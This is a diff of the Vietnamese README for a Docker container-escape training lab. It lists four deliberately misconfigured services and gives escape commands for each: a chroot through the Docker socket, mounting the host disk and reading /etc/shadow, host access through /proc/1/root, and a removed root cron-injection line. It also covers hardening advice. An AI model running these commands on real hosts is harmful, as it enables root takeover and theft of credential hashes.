@@ -1,5 +1,6 @@
-# Docker Escape Lab 🐳🔓
-### Môi trường thực hành Kỹ thuật Thoát khỏi Container & Cơ chế Cô lập Linux Kernel
+# Docker Escape Lab
+
+Lab Docker Compose gồm bốn container cấu hình hở sẵn để thực hành thoát khỏi container trên máy Linux hoặc WSL2.
 
 <p align="center">
   <img src="https://img.shields.io/badge/Docker-20.10%2B-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker" />
@@ -10,31 +11,22 @@
 
 <p align="center"><a href="README.md">English</a> · <strong>Tiếng Việt</strong></p>
 
-> **TUYÊN BỐ TRÁCH NHIỆM PHÁP LÝ & ĐẠO ĐỨC:**  
-> Dự án này cài đặt sẵn các kịch bản cố ý cấu hình sai nhằm phục vụ đào tạo bảo mật, nghiên cứu an ninh hạ tầng cloud và luyện tập CTF trên máy cá nhân cô lập. Tuyệt đối không áp dụng các kỹ thuật escape này lên bất kỳ hệ thống nào bạn không sở hữu hoặc chưa được cấp phép bằng văn bản.
+> Lab này tôi tự dựng với bốn lỗi cấu hình cố ý để thực hành thoát container trên máy cá nhân. Không chạy các kỹ thuật này lên hệ thống bạn không sở hữu hoặc chưa được cấp phép.
 
----
+## Tổng quan
 
-## Giới thiệu
+Mỗi service trong `docker-compose.yml` tách riêng một lỗi cấu hình hay gặp ngoài thực tế và đặt sẵn một file flag từ `/flag1.txt` đến `/flag4.txt`:
 
-**Docker Escape Lab** tái hiện 4 kịch bản thoát khỏi container thực tế nhất dựa trên các lỗi cấu hình thường gặp trong thực tế vận hành DevOps, hạ tầng CI/CD và môi trường cloud:
+| # | Service | Lỗi cấu hình | Hướng thoát ra host |
+|---|---|---|---|
+| 1 | `lab-sock-escape` | `-v /var/run/docker.sock:...` | Tạo container mới mount `/` của host rồi `chroot` |
+| 2 | `lab-privileged-escape` | `privileged: true` | Mount thẳng phân vùng ổ đĩa host (`/dev/sda`) |
+| 3 | `lab-pid-escape` | `pid: host` + `SYS_PTRACE` | Đi xuyên sang rootfs của host qua `/proc/1/root` |
+| 4 | `lab-volume-escape` | `-v /:/host:rw` | Ghi thẳng vào cron hoặc SSH key của host |
 
-| # | Kịch bản Escape | Lỗi cấu hình cốt lõi | Cơ chế kỹ thuật | Mức độ ảnh hưởng |
-|---|---|---|---|---|
-| 1 | **Docker Daemon Socket** | `-v /var/run/docker.sock:...` | Điều khiển API qua Unix Domain Socket | Tạo container mới mount ổ đĩa root của host (`chroot`) |
-| 2 | **Chế độ Đặc quyền** | `privileged: true` | Can thiệp trực tiếp block devices của host | Mount phân vùng ổ cứng host (`/dev/sda`, `/dev/nvme`) |
-| 3 | **Trùng PID Namespace** | `pid: host` + `SYS_PTRACE` | Đọc cấu trúc tiến trình qua `/proc` | Vượt qua ranh giới rootfs host qua `/proc/1/root` |
-| 4 | **Mount Thư mục Nhạy cảm** | `-v /:/host:rw` | Quyền ghi trực tiếp lên filesystem host | Cài mã thực thi qua Cron / Bơm SSH Authorized Keys |
+## Tự chạy tái lập
 
----
-
-## Bắt đầu nhanh
-
-### Yêu cầu
-- Đã cài đặt Docker & Docker Compose v2 trở lên.
-- Máy chủ Linux hoặc môi trường WSL2 trên Windows.
-
-### Khởi chạy Lab
+Yêu cầu: đã cài Docker và Docker Compose v2 trở lên trên Linux hoặc Windows WSL2.
 
 ```bash
 git clone https://github.com/Khanh1916/docker-escape-lab.git
@@ -42,101 +34,71 @@ cd docker-escape-lab
 docker compose up -d
 ```
 
-Kiểm tra trạng thái sẵn sàng của cả 4 container:
+Kiểm tra cả bốn container đã chạy:
 
 ```bash
 docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Image}}"
 ```
 
----
-
-## Hướng dẫn Khai thác từng Kịch bản
-
-### Kịch bản 1: Lộ Docker Daemon Socket (`/var/run/docker.sock`)
-Khi container có quyền truy cập socket Docker của host, nó nắm giữ quyền root trên toàn bộ Docker engine:
+Chạy script kiểm tra nhanh bốn cấu hình hở:
 
 ```bash
-# Truy cập container mục tiêu
+sh scripts/verify_all.sh
+```
+
+## Các bước khai thác
+
+### 1. Docker daemon socket
+
+```bash
 docker exec -it lab-sock-escape bash
 
-# Cách 1: Sử dụng Docker CLI có sẵn
+# Dùng Docker CLI
 docker run --rm -it -v /:/host alpine chroot /host
 
-# Cách 2: Sử dụng raw curl qua Unix socket (khi container không cài docker CLI)
+# Hoặc gọi trực tiếp qua curl nếu không có CLI
 curl -s --unix-socket /var/run/docker.sock http://localhost/version
 ```
 
-### Kịch bản 2: Container chạy Đặc quyền (`--privileged`)
-Ở chế độ privileged, thư mục `/dev` trong container phơi bày toàn bộ các ổ cứng vật lý và ảo của host:
+### 2. Container chạy privileged
 
 ```bash
-# Truy cập container privileged
 docker exec -it lab-privileged-escape bash
-
-# Xem danh sách ổ đĩa của host
 lsblk
-
-# Mount trực tiếp phân vùng ổ đĩa host
 mkdir -p /mnt/host_disk
 mount /dev/sda /mnt/host_disk
-
-# Đọc file mật khẩu băm của host
 head -n 5 /mnt/host_disk/etc/shadow
 ```
 
-### Kịch bản 3: Chia sẻ Host PID Namespace (`--pid=host`)
-Chia sẻ PID namespace cho phép container thấy tiến trình khởi tạo của host (PID 1) và truy cập cây thư mục gốc của host qua procfs:
+### 3. Dùng chung PID namespace với host
 
 ```bash
-# Truy cập container
 docker exec -it lab-pid-escape bash
-
-# Kiểm tra các tiến trình của host
 ps aux | head -n 10
-
-# Duyệt thư mục gốc của host qua /proc/1/root
 ls -la /proc/1/root/
-cat /proc/1/root/etc/passwd
+head -n 5 /proc/1/root/etc/passwd
 ```
 
-### Kịch bản 4: Mount Thư mục Nhạy cảm của Host (`/:/host:rw`)
-Quyền ghi trực tiếp lên ổ cứng host cho phép leo thang thành quyền thực thi code trên host:
+### 4. Mount thư mục nhạy cảm của host
 
 ```bash
-# Truy cập container
 docker exec -it lab-volume-escape sh
-
-# Thiết lập cron chạy mã trên host mỗi phút
-echo "* * * * * root touch /tmp/host_escaped" > /host/etc/cron.d/pwn_cron
-chmod 644 /host/etc/cron.d/pwn_cron
+ls -la /host
+echo "Escaped via Volume Mount" > /host/tmp/proof_escape.txt
 ```
 
----
+## Phòng thủ ra sao
 
-## Giải pháp Tăng cứng & Phòng thủ (Hardening)
+Không mount `/var/run/docker.sock` vào container app hay runner CI. Nếu cần build image thì chuyển sang Kaniko hoặc Buildah, còn nếu chỉ đọc thông tin container thì đặt `tecnativa/docker-socket-proxy` chặn phía trước và chỉ mở API `GET`. Cấm dùng `privileged: true`, drop hết capability bằng `--cap-drop=ALL`, và gắn `:ro` cho volume nào chỉ cần đọc. Ngoài ra nên bật `userns-remap` trong `/etc/docker/daemon.json` (hoặc chạy Rootless Docker / Podman) đi kèm `--read-only --tmpfs /tmp`.
 
-1. **Khóa chặt Docker Socket:** Tuyệt đối không mount `/var/run/docker.sock` vào workload thông thường. Nếu cần theo dõi metrics, hãy dùng Docker Socket Proxy (`tecnativa/docker-socket-proxy`) ở chế độ chỉ đọc.
-2. **Cấm hoàn toàn `--privileged`:** Áp dụng nguyên tắc Least Privilege: drop toàn bộ capabilities (`--cap-drop=ALL`) và chỉ cấp lại quyền thực sự cần thiết (`--cap-add=NET_BIND_SERVICE`).
-3. **Bật Filesystem Chỉ đọc:** Khởi chạy container với cờ `--read-only`, mount thư mục tạm bằng `--tmpfs /tmp`.
-4. **Bật User Namespaces (`userns-remap`):** Ánh xạ user root trong container sang một user bình thường không có quyền trên host.
-5. **Chạy Rootless Docker hoặc Podman:** Chạy toàn bộ daemon dưới user thường để triệt tiêu nguy cơ chiếm root host.
-
----
-
-## Dọn dẹp Môi trường
+## Dọn dẹp
 
 ```bash
 docker compose down
 ```
 
----
+## Bài viết chi tiết & Giấy phép
 
-## Bài viết Chi tiết & Tác giả
+Phân tích đầy đủ từng bước và cơ chế kernel xem tại: [khanh1916.github.io/notes](https://khanh1916.github.io/notes)
 
-Phân tích chuyên sâu về cơ chế kernel, phân tích log và hướng dẫn hardening chi tiết được xuất bản tại:
-- **Blog Tech Notes:** [https://khanh1916.github.io/notes](https://khanh1916.github.io/notes)
-- **Tác giả:** Nguyễn Nam Khánh ([@Khanh1916](https://github.com/Khanh1916))
-
-## Giấy phép
-
-Dự án phát hành dưới [Giấy phép MIT](LICENSE).
+Dự án phát hành theo [Giấy phép MIT](LICENSE).
